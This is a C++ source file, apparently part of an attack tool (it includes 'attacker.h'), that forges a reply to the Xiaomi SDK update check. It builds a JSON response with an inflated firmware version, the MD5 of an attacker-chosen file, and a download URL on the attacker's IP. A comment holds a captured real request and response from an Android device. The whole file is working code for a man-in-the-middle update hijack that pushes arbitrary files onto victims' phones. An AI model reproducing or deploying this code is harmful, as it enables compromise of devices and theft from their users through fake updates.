

#include "xiaomi.h"
#include <windows.h>
#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "../HttpUtils.h"


using namespace std;


int XiaoMiSdk::prepareRespData(unsigned long ulIP, string filepath, string filename) {

	int ret = 0;
	string ver = "V10.9.9.1.PDGCNFH";

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret == FALSE)
	{
		return FALSE;
	}

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: %u\r\n"
		"Connection: Keep-Alive\r\n\r\n%s";

	char * lpRespContentFormat =
	"{ \"v\":\"%s\",\"md5\":\"%s\",\"force\":0,\"url\":\"http://%s/%s\" }";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat, ver.c_str(), m_szmd5,
		szip.c_str(), filename.c_str() );
	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);

	return m_iRespSize;
}

/*
GET /api/checkupdate/lastusefulversion2?av=1.9.3&cv=2.8.1&d=28&f=S&i=34ff964cdf200754525e2f7821fc67e0&m=polaris&n=10&nonce=106597a9a45f25673cd6b3ea6d37856b&p=com.xiaomi.metoknlp&r=CN&ts=1543382044327&v=V10.0.7.0.PDGCNFH&sign=edc8573491e4c96f79244483afacce0e HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; MIX 2S MIUI/V10.0.7.0.PDGCNFH)
Host: sdkconfig.ad.xiaomi.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Date: Wed, 28 Nov 2018 05:14:07 GMT
Content-Type: application/json; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Content-Encoding: gzip

{"v":"","md5":"","force":0,"url":""}
*/